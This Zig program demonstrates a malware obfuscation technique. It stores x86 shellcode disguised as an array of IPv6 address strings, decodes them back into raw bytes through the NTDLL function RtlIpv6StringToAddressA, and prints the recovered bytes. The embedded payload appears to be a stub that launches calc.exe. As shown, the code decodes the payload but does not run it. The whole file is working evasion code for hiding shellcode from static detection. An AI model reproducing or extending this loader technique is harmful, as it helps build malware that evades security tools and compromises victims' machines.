const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

const IPV6_ARRAY: [13][]const u8 = [_][]const u8{
    "fce8:8200:0000:6089:e531:c064:8b50:308b",
    "520c:8b52:148b:7228:0fb7:4a26:31ff:ac3c",
    "617c:022c:20c1:cf0d:01c7:e2f2:5257:8b52",
    "108b:4a3c:8b4c:1178:e348:01d1:518b:5920",
    "01d3:8b49:18e3:3a49:8b34:8b01:d631:ffac",
    "c1cf:0d01:c738:e075:f603:7df8:3b7d:2475",
    "e458:8b58:2401:d366:8b0c:4b8b:581c:01d3",
    "8b04:8b01:d089:4424:245b:5b61:595a:51ff",
    "e05f:5f5a:8b12:eb8d:5d6a:018d:85b2:0000",
    "0050:6831:8b6f:87ff:d5bb:f0b5:a256:68a6",
    "95bd:9dff:d53c:067c:0a80:fbe0:7505:bb47",
    "1372:6f6a:0053:ffd5:6361:6c63:2e65:7865",
    "0000:0000:0000:0000:0000:0000:0000:0000"
};
const NUMBER_OF_ELEMENTS: usize = 13;

fn ipv6Deobfuscation(ipv6_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
    const ntdll = try windows.kernel32.GetModuleHandleA("NTDLL");
    const RtlIpv6StringToAddressA = @as(
        *const fn([*:0]const u8, [*]?[*:0]const u8, [*]u8) callconv(WINAPI) i32,
        @ptrCast(windows.kernel32.GetProcAddress(ntdll, "RtlIpv6StringToAddressA").?),
    );

    var buffer = try allocator.alloc(u8, ipv6_array.len * 16);
    var offset: usize = 0;

    for (ipv6_array) |ip| {
        const c_ip = try allocator.dupeZ(u8, ip);
        defer allocator.free(c_ip);
        var terminator: ?[*:0]const u8 = null;
        const result = RtlIpv6StringToAddressA(c_ip.ptr, &terminator, buffer.ptr + offset);
        if (result != 0) {
            return error.RtlIpv6StringToAddressAFailed;
        }
        offset += 16;
    }

    return buffer;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shellcode = try ipv6Deobfuscation(&IPV6_ARRAY, allocator);
    defer allocator.free(shellcode);
    std.debug.print("Decrypted shellcode length: {}\n", .{shellcode.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{shellcode});
}
